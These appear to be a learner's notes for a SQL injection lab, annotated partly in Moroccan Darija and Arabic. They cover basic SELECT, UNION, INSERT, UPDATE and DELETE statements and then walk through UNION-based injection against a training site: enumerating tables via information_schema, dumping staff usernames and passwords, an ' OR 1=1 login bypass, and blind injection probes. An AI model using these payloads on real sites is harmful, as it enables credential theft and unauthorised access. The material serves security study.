SQL : Structured Query Language

What is the acronym for the software that controls a database? : DBMS

What is the name of the grid-like structure which holds the data? : TABLE


SELECT
The first query type we'll learn is the SELECT query used to retrieve data from the database. 

select * from users;    (print all colom men table users)

select username,password from users;  (jib liya user w pass from user)

select * from users LIMIT 1;  (all colom li kaynin gha f ster lewel)

select * from users where username='admin';   (jib liya ga3 sfofa li fihom user kaysawi admin)

select * from users where username != 'admin';   (jib liya ga3 sfofa li men ghir li fihom user kaysawi admin)

select * from users where username='admin' or username='jon'; (jib ga3 li fihom admin w john )

select * from users where username='admin' and password='p4ssword';  (and rah baynaa)

select * from users where username like 'a%';   (jib li aya ster user dyali kaybda b "a")

select * from users where username like '%n';   (jib li aya ster user dyalo kaysali b "n")

select * from users where username like '%mi%';   (jib liya aya ster user dyalo fih herf "mi")

UNION

SELECT name,address,city,postcode from customers UNION SELECT company,address,city,postcode from suppliers; (kanjme3 tab 1 m3a 2 f tab wehda)

INSERT

insert into users (username,password) values ('bob','password123');   (bghit nzit ster f data huwa user w pass)

UPDATE

update users SET username='root',password='pass123' where username='admin'; ( bedel liya user b root)

تخبر عبارة UPDATE قاعدة البيانات أننا نرغب في تحديث صف واحد أو أكثر من البيانات داخل الجدول. يمكنك تحديد الجدول الذي ترغب في تحديثه باستخدام "update %tablename% SET" ثم تحديد الحقل أو الحقول التي ترغب في تحديثها كقائمة مفصولة بفواصل مثل "username='root',password='pass123'" ثم أخيرًا على غرار عبارة SELECT، يمكنك تحديد الصفوف التي سيتم تحديثها بالضبط باستخدام عبارة Where مثل "where username='admin;".

DELETE

delete from users where username='martin';   (mseh aya ster fih user howa martin)

delete from users;


///////////////////////////////////////////////////////////////////////////////

https://website.thm/blog?id=1 in background SELECT * from blog where id=1 and private=0 LIMIT 1;

////////////////////////////////////////////////////////////////////////////
TEST :
https://website.thm/article?id=1'
https://website.thm/article?id=1 UNION SELECT 1,2,3
https://website.thm/article?id=0 UNION SELECT 1,2,database()
https://website.thm/article?id=0 UNION SELECT 1,2,group_concat(table_name) FROM information_schema.tables WHERE table_schema = 'sqli_one'
https://website.thm/article?id=0 UNION SELECT 1,2,group_concat(username,':',password SEPARATOR '<br>') FROM staff_users

The first thing we need to do is return data to the browser without displaying an error message. Firstly we'll try the UNION operator so we can receive an extra result of our choosing. Try setting the mock browsers id parameter to:



1 UNION SELECT 1



This statement should produce an error message informing you that the UNION SELECT statement has a different number of columns than the original SELECT query. So let's try again but add another column:



1 UNION SELECT 1,2



Same error again, so let's repeat by adding another column:



1 UNION SELECT 1,2,3



Success, the error message has gone, and the article is being displayed, but now we want to display our data instead of the article. The article is being displayed because it takes the first returned result somewhere in the web site's code and shows that. To get around that, we need the first query to produce no results. This can simply be done by changing the article id from 1 to 0.



0 UNION SELECT 1,2,3



You'll now see the article is just made up of the result from the UNION select returning the column values 1, 2, and 3. We can start using these returned values to retrieve more useful information. First, we'll get the database name that we have access to:



0 UNION SELECT 1,2,database()



You'll now see where the number 3 was previously displayed; it now shows the name of the database, which is sqli_one.



Our next query will gather a list of tables that are in this database.



0 UNION SELECT 1,2,group_concat(table_name) FROM information_schema.tables WHERE table_schema = 'sqli_one'



There are a couple of new things to learn in this query. Firstly, the method group_concat() gets the specified column (in our case, table_name) from multiple returned rows and puts it into one string separated by commas. The next thing is the information_schema database; every user of the database has access to this, and it contains information about all the databases and tables the user has access to. In this particular query, we're interested in listing all the tables in the sqli_one database, which is article and staff_users. 



As the first level aims to discover Martin's password, the staff_users table is what is of interest to us. We can utilise the information_schema database again to find the structure of this table using the below query.



0 UNION SELECT 1,2,group_concat(column_name) FROM information_schema.columns WHERE table_name = 'staff_users'



This is similar to the previous SQL query. However, the information we want to retrieve has changed from table_name to column_name, the table we are querying in the information_schema database has changed from tables to columns, and we're searching for any rows where the table_name column has a value of staff_users.



The query results provide three columns for the staff_users table: id, password, and username. We can use the username and password columns for our following query to retrieve the user's information.



0 UNION SELECT 1,2,group_concat(username,':',password SEPARATOR '<br>') FROM staff_users

//////////////////////////////////////////////////////
LVL 2
' OR 1=1;--

lvl 3

https://website.thm/checkuser?username=admin
https://website.thm/checkuser?username=admin123' UNION SELECT 1,2,3;-- 
https://website.thm/checkuser?username=admin123' UNION SELECT 1,2,3 where database() like '%';--
https://website.thm/checkuser?username=admin123' UNION SELECT 1,2,3 where database() like 's%';--




































